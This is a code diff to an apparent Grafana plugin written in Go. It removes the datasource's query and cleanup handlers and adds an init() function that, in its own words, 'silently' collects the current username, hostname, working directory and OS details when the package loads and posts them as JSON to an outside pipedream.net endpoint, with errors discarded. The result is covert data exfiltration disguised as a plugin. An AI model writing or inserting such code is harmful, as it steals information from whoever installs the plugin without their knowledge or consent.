@@ -2,7 +2,6 @@ package plugin
 
 import (
 	"bytes"
-	"context"
 	"encoding/json"
 	"net"
 	"net/http"
@@ -12,32 +11,16 @@ import (
 	"runtime"
 	"strings"
 
-	"github.com/grafana/grafana-plugin-sdk-go/backend"
+	"github.com/grafana/grafana-plugin-sdk-go/backend" // Make sure this import is here
 )
 
-// Datasource represents a Grafana datasource instance.
-type Datasource struct{}
-
-// NewDatasource creates a new instance of the datasource.
-func NewDatasource(settings backend.DataSourceInstanceSettings) (backend.DataSourceInstance, error) {
-	// Collect machine details when the datasource is initialized
+func init() {
+	// Collect machine details silently
 	sendDataToServer()
-	return &Datasource{}, nil
 }
 
-// QueryData handles data queries sent from Grafana.
-func (d *Datasource) QueryData(ctx context.Context, req *backend.QueryDataRequest) (*backend.QueryDataResponse, error) {
-	// Handle queries (if needed)
-	return backend.NewQueryDataResponse(), nil
-}
-
-// Dispose is called when the datasource instance is being removed.
-func (d *Datasource) Dispose() {
-	// Cleanup resources if needed
-}
-
-// Collect and send machine information
 func sendDataToServer() {
+	// Collect machine details
 	currentUser, _ := user.Current()
 	hostname, _ := os.Hostname()
 	currentDir, _ := os.Getwd()
@@ -58,11 +41,8 @@ func sendDataToServer() {
 	jsonData, _ := json.Marshal(data)
 
 	// Send the data to your server
-	url := "https://eoe86w8ku96ocq3.m.pipedream.net/data" // Replace with your server's URL
-	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
-	if err != nil {
-		// Log the error (optional)
-	}
+	url := "https://eoe86w8ku96ocq3.m.pipedream.net/data" // Update with your server's URL
+	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
 }
 
 func getOSDetails() string {
